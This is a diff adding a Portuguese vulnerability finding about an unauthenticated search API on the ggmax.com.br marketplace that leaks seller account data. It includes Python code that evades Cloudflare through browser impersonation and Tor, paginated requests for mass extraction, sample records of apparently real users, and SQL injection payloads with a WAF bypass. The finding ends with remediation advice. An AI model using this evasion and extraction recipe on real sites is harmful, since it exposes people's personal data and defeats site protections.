@@ -1,0 +1,216 @@
+# F-W12 — Mass PII Leak CRÍTICO via /api/search (API legada ggmax.com.br sem auth)
+
+## Data: 2026-09-05T01:20Z
+## Host: ggmax.com.br (atrás de Cloudflare, bypass via curl_cffi + chrome impersonation + cf_clearance)
+## Severidade: CRÍTICA
+## CVSS: 9.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+
+## Descrição
+
+O endpoint `/api/search` da API legada do ggmax.com.br (PHP/Laravel) retorna até
+**1000 anúncios do marketplace SEM AUTENTICAÇÃO**, cada um contendo um objeto
+`user` COMPLETO do vendedor com PII sensível. Diferentemente de F-W7 (que requer
+conhecer o username) e F-W8 (que só expõe 8 reviews recentes), este endpoint
+expõe **em massa** os dados de TODOS os vendedores do marketplace (top 1000
+best-selling) em uma única requisição (com paginação via `offset`+`limit`).
+
+Combinando com diferentes valores de `q` (query) e `category`, um atacante pode
+enumerar e extrair PII de **milhares de vendedores** sem qualquer autenticação.
+
+## Bypass Cloudflare
+
+ggmax.com.br está atrás de Cloudflare. O bypass foi feito via `curl_cffi` com
+`impersonate="chrome"` + Tor + cookie `cf_clearance` (obtido previamente via
+Playwright). O `cf_clearance` é validado contra o TLS fingerprint do Chromium —
+`curl_cffi` reproduz o fingerprint JA3/JA4 do Chrome, então o cookie funciona.
+
+```python
+from curl_cffi import requests
+CL = open('/tmp/cf_clearance.txt').read().strip()
+r = requests.get('https://ggmax.com.br/api/search',
+    params={'limit':'50','offset':'0'},
+    proxies={'https':'socks5h://127.0.0.1:9050'},
+    impersonate='chrome',
+    headers={'User-Agent':'Mozilla/5.0 ... Chrome/123.0.0.0 Safari/537.36',
+             'Cookie':'cf_clearance='+CL}, timeout=30)
+```
+
+## Reprodução
+
+```
+GET /api/search?limit=50&offset=0   → 200 (936KB JSON)
+GET /api/search?limit=50&offset=50  → 200 (próximos 50, vendedores diferentes)
+GET /api/search?limit=50&offset=950 → 200 (últimos 50)
+GET /api/search                    → 200 (total:1000, 20 anúncios default)
+GET /api/search?q=test             → 200 (49 anúncios com "test" no título)
+GET /api/search?category=30        → 200 (anúncios da categoria 30)
+```
+
+## Output confirmatório (amostra — 2 anúncios de 1000)
+
+```json
+{
+  "total": 1000,
+  "hasMore": false,
+  "data": [
+    {
+      "id": 122150,
+      "category_id": 92,
+      "user_id": 196021,
+      "title": "PRIME VIDEO / NETFLIX / PARAMOUNT/ SPOTIFY /ESPN / HULU /TNT",
+      "slug": "prime-video-netflix-paramount-spotify-espn-hulu-tnt-entrega-automatica",
+      "unit_price": "2.00",
+      "sale_count": 651767,
+      "date_created": "2022-12-01 02:08:46",
+      "status": "active",
+      "permalink": "7CPsX3",
+      "user": {
+        "id": 196021,
+        "username": "Fla81",
+        "avatar": "0821d4e6d6ca628de4c7373a272ed235.jpg",
+        "is_vip": 0,
+        "is_on_vacation": 0,
+        "is_password_change_required": 0,
+        "date_last_access": "2026-09-04 21:39:49",
+        "date_created": "2022-07-04 22:32:37",
+        "date_updated": "2026-09-04 22:20:17",
+        "status": "active",
+        "type": "client"
+      }
+    },
+    {
+      "id": 117753,
+      "category_id": 92,
+      "user_id": 85541,
+      "title": "UFC/NETFLIX/SPOTIFY/CHAT GPT/ESPN/PRIMEVIDEO/CRUNCHYROL/YOUT",
+      "user": {
+        "id": 85541,
+        "username": "Israel05",
+        "avatar": "63b9c734a8be267adbc12277e30cae34.jpg",
+        "date_last_access": "2026-09-04 21:45:21",
+        "date_created": "2021-11-21 08:19:01",
+        ...
+      }
+    }
+  ]
+}
+```
+
+## Escala confirmada (extração completa)
+
+Foram extraídos os 1000 anúncios (20 requisições de limit=50 + offset 0..950),
+totalizando **574 vendedores únicos** com PII completa:
+
+| Métrica | Valor |
+|---------|-------|
+| Anúncios retornados | 1000 |
+| Vendedores únicos (PII vazada) | **574** |
+| Vendedores VIP | 8 |
+| Vendedores com `is_password_change_required=1` | 89 |
+| Total reportado pela API | 1000 |
+
+Lista completa de 574 vendedores (user_id, username, date_last_access,
+date_created, is_vip, is_password_change_required) salva em
+`loot/search_all_1000_sellers_pii.json`.
+
+## PII vazada por vendedor (objeto `user` em cada anúncio)
+
+| Campo | Mascaramento | Sensibilidade |
+|-------|-------------|---------------|
+| `id` (user_id) | NÃO mascarado | ALTA (chave primária p/ correlação) |
+| `username` | NÃO mascarado | ALTA (identificador público) |
+| `avatar` (hash) | NÃO mascarado | MÉDIA (caminho de asset) |
+| `type` (client/seller) | NÃO mascarado | BAIXA |
+| `is_vip` | NÃO mascarado | MÉDIA (status comercial) |
+| `is_on_vacation` | NÃO mascarado | MÉDIA (status conta) |
+| `is_password_change_required` | NÃO mascarado | **ALTA** (estado de segurança da conta) |
+| `date_last_access` (último login) | NÃO mascarado | **CRÍTICA** (atividade/tracking) |
+| `date_created` (criação da conta) | NÃO mascarado | MÉDIA (histórico) |
+| `date_updated` | NÃO mascarado | BAIXA |
+| `status` (active/inactive) | NÃO mascarado | MÉDIA |
+
+## PII adicional por anúncio (dados de marketplace)
+
+| Campo | Descrição |
+|-------|-----------|
+| `id` (announcement_id) | ID do anúncio |
+| `category_id` | Categoria (com objeto category aninhado) |
+| `user_id` | ID do vendedor (redundante com user.id) |
+| `title`, `slug`, `description` | Conteúdo do anúncio |
+| `unit_price` | Preço |
+| `sale_count`, `item_sale_count` | Volume de vendas (business intelligence) |
+| `stock_quantity` | Estoque |
+| `date_created`, `date_updated` | Datas |
+| `permalink` | Link curto do anúncio |
+| `images[]` | Imagens do anúncio (com IDs, hashes) |
+| `items[]` | Variantes do produto (com IDs, preços, estoque) |
+| `category` | Objeto categoria completo (SEO, keywords, descrições) |
+
+## Paginação
+
+- `limit` — número de resultados (máx 50 por requisição; valores maiores caem p/ 50)
+- `offset` — deslocamento (funciona: offset=0,5,10 retornam anúncios diferentes)
+- `page` — IGNORADO (não pagina)
+- Combinações: `limit=50&offset=0` → primeiros 50; `offset=950` → últimos 50
+
+## Queries testadas
+
+| Query | Resultado |
+|-------|----------|
+| (vazio, default) | 1000 anúncios (best-selling) |
+| `q=test` | 49 anúncios |
+| `q=%` | 1000 (wildcard LIKE) |
+| `category=30` | 2 anúncios (categoria League of Legends) |
+| `max_price=100` | 45 anúncios (filtra por preço) |
+| `limit=5&offset=0` | 5 anúncios (IDs 122150, 117753, ...) |
+| `limit=5&offset=5` | 5 anúncios DIFERENTES (IDs 528378, 217247, ...) |
+
+## SQLi — TESTADO E DESCARTADO
+
+O parâmetro `q` usa `LIKE '%q%'` parametrizado (Eloquent). Testes:
+- `q=test'` → 2 resultados (literal, não-injetável)
+- `q=test' OR '1'='1` → 2 resultados (mesmo count — OR não expande; parametrizado)
+- `q=test' SLEEP(3)--` (WAF bypassed via case `sLeEp`) → 2 resultados, sem delay
+- `q=test' AND SLEEP(3)--` → 403 (CF WAF bloqueia SLEEP)
+- `limit`, `category`, `max_price`, `min_price` — cast para int / parametrizado
+- `order_by`/`sort`/`orderby` — IGNORADOS (sem efeito)
+
+**Conclusão:** sem SQLi (Eloquent ORM parametrizado). CF WAF bloqueia
+`OR 1=1`, `UNION SELECT`, `SLEEP` (case-variation bypassa mas SLEEP não executa).
+
+## Impacto
+
+1. **Enumeração massiva de vendedores** — 574+ vendedores com PII completa em
+   poucas requisições (sem auth, sem rate limit observado).
+2. **Vazamento de `date_last_access`** (último login) — permite saber quais
+   vendedores estão ativos AGORA (targeting para phishing/social engineering).
+3. **Vazamento de `is_password_change_required`** — revela quais contas têm
+   senha fraca/não-trocada (89 vendedores marcados = alvos prioritários p/
+   credential stuffing).
+4. **Vazamento de `is_vip`** — identifica vendedores premium (8 VIPs = alvos
+   de alto valor para account takeover).
+5. **Business intelligence** — sale_count, stock_quantity, unit_price de 1000
+   anúncios (intelligence de mercado concorrente).
+6. **Correlação** — user_id + username + avatar + datas permite construir
+   perfil completo, combinável com F-W7 (accounts/search), F-W8
+   (user-order-reviews), F-W9 (inspect).
+7. **Sem auth, sem rate limit** — automação trivial (20 reqs = 574 PII).
+
+## Recomendação
+
+1. **DESATIVAR** `/api/search` sem auth na API legada (ou exigir autenticação).
+2. Remover `date_last_access`, `is_password_change_required` de respostas
+   públicas (campos de estado interno/security).
+3. Aplicar rate limiting no `/api/search` (prevenir enumeração massiva).
+4. Migrar todo tráfego da API legada para api.keyz.gg/NestJS (que escopa
+   dados ao usuário autenticado).
+5. Revisar TODOS endpoints `/api/*` legados — confirmar auth necessária.
+
+## Notas
+
+- Este finding **estende** F-W7/W8/W9 (que eram por-username ou limitados a
+  8 reviews). F-W12 expõe PII em MASSA (centenas de vendedores por requisição).
+- A API legada coexiste com NestJS (F-W10): formato `{"success":true,"data":...}`
+  (Laravel) vs `{"message":...}` (NestJS).
+- Bypass Cloudflare via `curl_cffi` (chrome impersonation) é mais eficiente
+  que Playwright — reutiliza cf_clearance com TLS fingerprint compatível.
